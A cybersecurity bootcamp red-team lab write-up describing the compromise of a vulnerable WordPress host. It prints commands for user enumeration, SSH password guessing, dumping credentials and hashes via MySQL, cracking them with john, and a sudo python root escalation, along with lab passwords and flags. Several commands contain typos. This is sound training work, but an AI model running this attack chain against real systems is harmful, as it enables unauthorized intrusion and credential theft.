# Red Team: Summary of Operations

## Table of Contents
- Exposed Services
- Critical Vulnerabilities
- Exploitation

### Exposed Services

Nmap scan results for each machine reveal the below services and OS details:

`nmap 192.168.1.0/24`

![full nmap 1](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/full%20nmap%20part%201.PNG)
![full nmap 2](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/full%20nmap%20part%202.PNG)

## Target 1

`nmap 192.168.1.110`



This scan identifies the services below as potential points of entry:
- Target 1
  - Exposed Services
  * Open Port 22/TCP - SSH
  * Open Port 80/TCP - HTTP
  * Open Port 111/TCP - rpcbind
  * Open Port 139/TCP - netbios-ssn
  * Open Port 445/TCP - microsoft-ds

The following vulnerabilities were identified on each target:
- Target 1
  - User Enumeration (WordPress Site)
  - Weak User Password
  - Unsalted User Password Hash (WordPress Database)
  - Misconfiguration of User Privileges/Privilege Escalation

![nmap target 1](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/nmap%20target%201.PNG)

### Exploitation
The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:
- Target 1
  - `flag1.txt`: `b9bbcb33ellb80be759c4e844862482d`
    - **Exploit Used**
      - WPscan was used from the attack machine to enumerate the users on the Target1 wordpress site
      - The Command use
        - `wpscan --url 192.168.1.110/wordpress/ -enumerate u`
      - SSH'd into `192.168.1.110` using the user `Michael` guessed the weak password `Michael`
      - Navigated to /var/wwww/html/
      - Ran `nano services.html` and in the footer information found Flag 1

![wordpress 1](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/word%20press%201.PNG)

![wordpress 2](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/word%20press%202.PNG)

![Flag1](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/flag%201.png)

  - `flag2.txt`:`flag2{fc3fd58dcdad9ab23faca6e9a3e581c}`
    - **Exploit Used**
      - Flag 2 was located while exploring `Target1` to find other potential useful files.
      - `cd ..`
      - `ls`
      - `nano flag2.txt`

![flag2](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/flag%202.PNG)

 - `flag3.txt`:`flag3{afc01ab56b50591e7dccf93122770cd2}`
    - **Exploit Used**
      - During infiltration `wp-config.php` was found at `/var/www.html/wordpress`
      - `nano wp-config.php` and found the admin user is `root` and the password is `R@v3nSecurity`
      - `Crtl X` to exit nano.
      - `myspql --user=root --password=R@v3nSecurity -h 127.0.0.1` to enter the database
      - `showdatabases;` to view databases
      - `use wordpress;` to use the wordpress database
      - `select * from wp_posts;` to find flag3 and flag4 in wp_posts.
      - `select * from wp_users;` to find users and password hashes.

![user & pass](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/pass%20%26%20user.PNG)

![enter pass](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/enter%20pass.PNG)

![sql 1](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/sql.PNG)

![sql 2](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/sql%20hashes.PNG)

![Flag3](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/flag%203%20%26%204.PNG)

 - `flag4.txt`:`flag4{715dea6c055b9fe3337544932f2941ce}`
    - **Exploit Used**
      - Simple password and unsalted hash
        - Created a hash.txt that contained user `steven` hash `$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/` on attacking machine
        - Copied `Rockyou.txt` from `/usr/share/wordlists/rockyou.txt wp_hashes.txt` incase it is needed for another hash crack. 
        - Ran `john hash.txt --wordlist=rockyou.txt` and found that the password is `pink84`
        - Ran `-ssh steven@192.168.1.110` using pink84 as the password. 
        - Ran `sudo python -c "import pty;pty.spawn('/bin/bash')"` this gave Root privileges
        - `CD /root`
        - `ls` saw flag4.txt
        - `cat flag4.txt` to find the flag.

![john hashes](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/john%20hashes.PNG)

![flag4](https://github.com/dsteves28/CyberSecurity-Bootcamp/blob/main/Final%20Project/1.%20Red%20Team%20-Summary%20of%20Operations/flag%203%20%26%204.PNG)